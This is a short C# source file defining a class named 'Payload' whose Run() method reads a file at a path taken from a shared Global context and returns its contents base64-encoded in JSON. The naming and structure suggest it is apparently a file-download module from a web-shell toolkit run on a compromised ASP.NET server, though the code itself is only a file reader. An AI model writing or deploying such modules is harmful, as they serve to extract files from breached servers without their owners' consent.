using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Security.AccessControl;
using System.Linq;

public class Payload
{

    [DataContract]
    class Ret
    {

        [DataMember]
        public int code = 0;

        [DataMember]
        public string msg = "";
    }
    Ret ret;
    public string Run()
    {
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        if (File.Exists(Global.path))
        {
            ret.msg = Convert.ToBase64String(File.ReadAllBytes(Global.path));
            ret.code = 1;
        }
        else if (Directory.Exists(Global.path))
        {
            ret.code = -3;
            ret.msg = Path.DirectorySeparatorChar + "";

        }
        return Global.json_encode(ret);
    }

}